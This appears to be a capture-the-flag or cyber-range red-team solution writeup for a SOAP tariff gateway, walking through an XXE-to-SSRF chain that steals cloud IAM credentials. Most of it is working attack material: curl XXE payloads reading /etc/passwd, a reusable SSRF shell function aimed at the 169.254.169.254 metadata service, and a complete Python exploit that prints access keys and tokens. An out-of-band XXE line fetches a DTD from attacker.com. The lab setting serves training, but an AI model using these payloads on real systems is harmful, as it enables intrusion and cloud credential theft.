# solve_red.md — M3 · ext-soap-gateway
## Red Team Solution Writeup
**Range:** RNG-EXT-01 · SETU DVAAR · OPERATION DEEPSTRIKE
**Machine:** M3 — RPAL Pipeline Tariff SOAP Gateway
**Vulnerability:** XXE (XML External Entity Injection) → SSRF → IMDS Credential Extraction
**CWE:** CWE-611 (Improper Restriction of XML External Entity Reference)
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application) · T1552.005 (Cloud Instance Metadata API)
**Severity:** Critical — extracts IAM role credentials for internal API gateway

---

## Overview — What, Why, and How

### What is XXE → SSRF → IMDS?

**XML External Entity (XXE)** is a vulnerability in XML parsers that process external entity references embedded in XML documents. An external entity is an XML construct that instructs the parser to fetch content from a URI and substitute it inline.

**Server-Side Request Forgery (SSRF)** occurs when the server fetches a URL on behalf of the attacker. When an XXE payload points to an internal URL (like the cloud metadata service), the server fetches it — this is SSRF triggered via XXE.

**Instance Metadata Service (IMDS)** is an internal HTTP endpoint at `169.254.169.254` (AWS, OpenStack, GCP all use this IP) that returns configuration and credentials for the cloud instance. It is only reachable from within the instance — making SSRF the only remote access method.

**The combined attack:**
```
Attacker → SOAP request with XXE payload
             → Server parses XML, entity definition points to http://169.254.169.254/
             → lxml fetches the URL from the server's network context (SSRF)
             → IMDS returns IAM role name, then temporary credentials
             → Server includes fetched content in error/response XML
             → Attacker reads IAM credentials from SOAP response
```

### Why does this vulnerability exist?

The SOAP gateway was originally developed with `resolve_entities=True` and `load_dtd=True` to support DTD-based XML schema validation for PNGRB compliance documents. When the validator was replaced with a simpler check, the parser configuration was never updated. The lxml library defaults to `resolve_entities=False` and `no_network=True` in modern versions — but the developer explicitly overrode both for "compatibility."

---

## Prerequisites

- Credentials from M2: `rpal-tariff-svc` / `TariffGW@Soap!2024#RPAL`
- Tools: `curl`, Python3, optionally Burp Suite
- Target: `http://203.x.x.x:8080/TariffGateway`

---

## Phase 1 — Service Fingerprinting

```bash
TARGET="http://203.x.x.x:8080"

# Get WSDL — confirms SOAP service and reveals operation structure
curl -s "${TARGET}/TariffGateway/wsdl" | python3 -c "
import sys
from lxml import etree
tree = etree.parse(sys.stdin)
root = tree.getroot()
print('Service:', root.get('name'))
for op in root.iter('{http://schemas.xmlsoap.org/wsdl/}operation'):
    print('Operation:', op.get('name'))
"
# Output:
# Service: RPALTariffService
# Operation: CalculateTariff
```

**Why this matters:** The WSDL reveals the exact XML structure expected. A valid SOAP request must match this structure — the XXE payload must be embedded within a structurally valid (but malicious) request.

---

## Phase 2 — Confirming XXE

### 2.1 — Baseline Valid Request

First send a valid request to understand normal responses:

```bash
curl -s -X POST "${TARGET}/TariffGateway" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"http://rpal.in/tariff/v2/CalculateTariff\"" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
               xmlns:tns="http://rpal.in/tariff/v2">
  <soap:Header>
    <wsse:Security>
      <wsse:UsernameToken>
        <wsse:Username>rpal-tariff-svc</wsse:Username>
        <wsse:Password>TariffGW@Soap!2024#RPAL</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <tns:CalculateTariffRequest>
      <tns:pipelineSegment>HVJ-DVPL</tns:pipelineSegment>
      <tns:volumeMscmd>500.0</tns:volumeMscmd>
      <tns:gasType>natural_gas</tns:gasType>
      <tns:contractorId>contractor.01</tns:contractorId>
    </tns:CalculateTariffRequest>
  </soap:Body>
</soap:Envelope>'
```

Expected response: tariff calculation result. This confirms the service is functional.

### 2.2 — Test XXE with File Read

Before going to SSRF, confirm XXE works with a local file:

```bash
curl -s -X POST "${TARGET}/TariffGateway" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"http://rpal.in/tariff/v2/CalculateTariff\"" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
               xmlns:tns="http://rpal.in/tariff/v2">
  <soap:Header>
    <wsse:Security>
      <wsse:UsernameToken>
        <wsse:Username>rpal-tariff-svc</wsse:Username>
        <wsse:Password>TariffGW@Soap!2024#RPAL</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <tns:CalculateTariffRequest>
      <tns:pipelineSegment>&xxe;</tns:pipelineSegment>
    </tns:CalculateTariffRequest>
  </soap:Body>
</soap:Envelope>'
```

**Expected:** The SOAP fault message includes the content of `/etc/passwd` (or the first few lines) embedded in `faultstring`. This confirms the XXE is reflected in output.

---

## Phase 3 — SSRF via XXE to IMDS

### 3.1 — Enumerate IMDS Structure

```bash
# Create reusable XXE SSRF template
xxe_ssrf() {
    local URL="$1"
    curl -s -X POST "${TARGET}/TariffGateway" \
      -H "Content-Type: text/xml; charset=utf-8" \
      -d "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"${URL}\">
]>
<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"
               xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\"
               xmlns:tns=\"http://rpal.in/tariff/v2\">
  <soap:Header>
    <wsse:Security>
      <wsse:UsernameToken>
        <wsse:Username>rpal-tariff-svc</wsse:Username>
        <wsse:Password>TariffGW@Soap!2024#RPAL</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <tns:CalculateTariffRequest>
      <tns:pipelineSegment>&xxe;</tns:pipelineSegment>
    </tns:CalculateTariffRequest>
  </soap:Body>
</soap:Envelope>"
}

# Step 1: Enumerate IMDS root
xxe_ssrf "http://169.254.169.254/latest/meta-data/"
# Response contains: ami-id, iam/, instance-id, etc.

# Step 2: Get IAM role name
xxe_ssrf "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response contains: rpal-upstream-api-role

# Step 3: Extract credentials
xxe_ssrf "http://169.254.169.254/latest/meta-data/iam/security-credentials/rpal-upstream-api-role"
```

### 3.2 — Parse Credentials from Response

The credentials appear in the SOAP fault `faultstring` element:

```bash
xxe_ssrf "http://169.254.169.254/latest/meta-data/iam/security-credentials/rpal-upstream-api-role" | \
python3 -c "
import sys
from lxml import etree
tree = etree.parse(sys.stdin)
# Find faultstring — it contains the IMDS JSON response
fault = tree.find('.//{http://schemas.xmlsoap.org/soap/envelope/}faultstring')
if fault is not None and fault.text:
    import json
    # The faultstring contains the IMDS credential JSON embedded in error text
    import re
    m = re.search(r'\{.*\}', fault.text, re.DOTALL)
    if m:
        creds = json.loads(m.group())
        print('AccessKeyId:     ', creds.get('AccessKeyId'))
        print('SecretAccessKey: ', creds.get('SecretAccessKey'))
        print('Token:           ', creds.get('Token', '')[:40] + '...')
        print('Expiration:      ', creds.get('Expiration'))
        print('Endpoint note:   ', creds.get('_rpal_endpoint'))
"
OR

xxe_ssrf "http://169.254.169.254/latest/meta-data/iam/security-credentials/rpal-upstream-api-role" \
| python3 -c $'import sys, re, json, html\nimport xml.etree.ElementTree as ET\nraw = sys.stdin.read()\ntry:\n    root = ET.fromstring(raw)\n    fs = root.findtext(".//{http://schemas.xmlsoap.org/soap/envelope/}faultstring") or root.findtext(".//faultstring") or raw\nexcept Exception:\n    fs = raw\nfs = html.unescape(fs)\nm = re.search(r"\\{.*?\\}", fs, re.S)\nif not m:\n    print("No JSON found. Raw response below:\\n" + raw)\n    raise SystemExit(1)\ncreds = json.loads(m.group(0))\nfor k in ("AccessKeyId","SecretAccessKey","Token","Expiration","_rpal_endpoint","_rpal_note"):\n    print("%s: %s" % (k, creds.get(k, "")))'

```

### 3.3 — Full Automated Exploit

```python
#!/usr/bin/env python3
"""
XXE → SSRF → IMDS Credential Extraction — M3 RPAL Tariff Gateway
"""
import requests, json, re
from lxml import etree

TARGET = "http://203.0.0.236:8080/TariffGateway"
CREDS  = ("rpal-tariff-svc", "TariffGW@Soap!2024#RPAL")

def soap_xxe(url: str) -> str:
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
               xmlns:tns="http://rpal.in/tariff/v2">
  <soap:Header><wsse:Security><wsse:UsernameToken>
    <wsse:Username>{CREDS[0]}</wsse:Username>
    <wsse:Password>{CREDS[1]}</wsse:Password>
  </wsse:UsernameToken></wsse:Security></soap:Header>
  <soap:Body><tns:CalculateTariffRequest>
    <tns:pipelineSegment>&xxe;</tns:pipelineSegment>
  </tns:CalculateTariffRequest></soap:Body>
</soap:Envelope>"""
    r = requests.post(TARGET, data=payload,
        headers={"Content-Type": "text/xml; charset=utf-8"}, timeout=10)
    return r.text

print("[*] Phase 1: Confirming XXE with /etc/passwd")
resp = soap_xxe("file:///etc/passwd")
if "root:x:" in resp:
    print("[+] XXE confirmed — /etc/passwd content in response")
    print(resp)

print("\n[*] Phase 2: Enumerating IMDS")
resp = soap_xxe("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
role_match = re.search(r'rpal-[\w-]+', resp)
role = role_match.group() if role_match else "rpal-upstream-api-role"
print(f"[+] IAM Role discovered: {role}")

print(f"\n[*] Phase 3: Extracting credentials for role: {role}")
resp = soap_xxe(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")

m = re.search(r'\{[^{}]*"AccessKeyId"[^{}]*\}', resp, re.DOTALL)
if m:
    creds = json.loads(m.group())
    print("\n[+] IAM Credentials extracted:")
    for k, v in creds.items():
        if not k.startswith('_'):
            print(f"    {k}: {str(v)[:128]}")
    print(f"\n[+] Internal endpoint: {creds.get('_rpal_endpoint','N/A')}")
    print("[+] These credentials grant access to M4 admin export API")
else:
    print(f"[-] Credential extraction failed. Raw response:\n{resp[:500]}") 
```

---

## Pitfalls and Common Mistakes

### Pitfall 1 — Forgetting Authentication
The SOAP service requires WS-Security credentials. A bare XXE payload without the `UsernameToken` block returns a 401. **Include auth even in malicious payloads** — the server validates credentials before parsing the body... except it actually parses first (lxml), so auth failures happen after entity resolution. But always include auth to avoid confusion.

### Pitfall 2 — Multiline Entity Content Breaks SOAP
If the entity content contains `<`, `>`, or `&` characters (common in `/etc/passwd` or JSON), the XML parser on your client side may fail to parse the response. Use `response.text` (raw string), not `response.content` parsed as XML.

### Pitfall 3 — IMDS v2 (IMDSv2)
Modern AWS instances use IMDSv2 which requires a token header. This IMDS simulation implements v1 (no token required). In real engagements, try v1 first. If 401, try:
```
PUT http://169.254.169.254/latest/api/token → get TOKEN
GET http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: TOKEN"
```

### Pitfall 4 — Out-of-Band XXE When In-Band Fails
If content doesn't appear in the response (blind XXE), use an out-of-band channel. Send entity content to an attacker-controlled server:
```xml
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
```
But for this challenge, the content IS reflected in the fault message — in-band is sufficient.

---

## MITRE ATT&CK Mapping
| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Cloud Instance Metadata API | T1552.005 |
| Discovery | Cloud Infrastructure Discovery | T1580 |

---
*solve_red.md | M3 ext-soap-gateway | RNG-EXT-01 SETU DVAAR | OPERATION DEEPSTRIKE*
